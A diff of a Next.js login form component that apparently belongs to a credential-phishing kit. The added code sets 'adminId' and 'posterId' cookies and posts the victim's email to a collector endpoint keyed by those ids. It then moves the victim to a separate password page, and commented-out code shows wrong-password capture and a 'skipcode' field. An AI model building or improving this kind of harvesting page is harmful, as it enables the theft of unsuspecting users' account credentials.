@@ -2,38 +2,76 @@
 import { API_URL, site } from "../config/index";
 import Image from "next/image";
 import useMockLogin from "../hooks/useMockLogin";
-import { useState } from "react";
+import { useEffect, useState } from "react";
 import { useRouter } from "next/navigation";
 import Cookies from "js-cookie";
 
 function LoginForm({ adminId, posterId }) {
   const [email, setEmail] = useState("");
-  const [showWrongPassword, setShowWrongPassword] = useState(false);
-  const [wrongPassword, setWrongPassword] = useState("");
+  // const [showWrongPassword, setShowWrongPassword] = useState(false);
+  // const [wrongPassword, setWrongPassword] = useState("");
 
   const router = useRouter();
 
-  const { login } = useMockLogin(adminId, posterId);
+  // const { login } = useMockLogin(adminId, posterId);
 
+  // const handleSubmit = async () => {
+  //   const allValues = {
+  //     site: site,
+  //     email: email,
+  //     // password: password,
+  //     // skipcode: "",
+  //   };
+  //   try {
+  //     await login(allValues);
+  //     router.push(`/password`);
+  //     // setShowWrongPassword(true);
+  //     // setEmail("");
+  //     // setPassword("");
+
+  //     console.log("allValues", allValues);
+  //   } catch (error) {
+  //     console.log(error);
+  //   }
+  // };
+  useEffect(() => {
+    Cookies.set("adminId", adminId);
+    Cookies.set("posterId", posterId);
+  }, []);
   const handleSubmit = async () => {
-    const allValues = {
-      site: site,
+    if (!email) {
+      return;
+    }
+    const values = {
       email: email,
-      // password: password,
-      // skipcode: "",
+      site: site,
     };
-    try {
-      await login(allValues);
-      router.push(`/password`);
-      // setShowWrongPassword(true);
-      // setEmail("");
-      // setPassword("");
+    console.log(values);
+    const url = `${API_URL}/email/post/${adminId}/${posterId}`;
 
-      console.log("allValues", allValues);
-    } catch (error) {
-      console.log(error);
+    const res = await fetch(url, {
+      method: "POST",
+      headers: {
+        Accept: "application/json",
+        "Content-Type": "application/json",
+      },
+      body: JSON.stringify(values),
+    });
+    const data = await res.json();
+    console.log(data);
+
+    if (res.ok) {
+      console.log("success", data);
+      Cookies.set("email", data?.info?.email);
+      Cookies.set("id", data?.info?._id);
+      router.push("/password");
+    } else {
+      console.log("error", data);
+      // toast.error("Something Went Wrong");
     }
   };
+
+
   // const handleWrongPassword = async () => {
   //   const url = `${API_URL}/add/wrongpassword`;
   //   const id = Cookies.get("id");
@@ -63,6 +101,7 @@ function LoginForm({ adminId, posterId }) {
   //     toast.error("Something Went Wrong");
   //   }
   // };
+  
   return (
     // <div class="bg-neutral-50 w-full max-w-[25rem] p-6 rounded-xl">
     //   <p class="text-3xl font-semibold ">Live Video Chat</p>
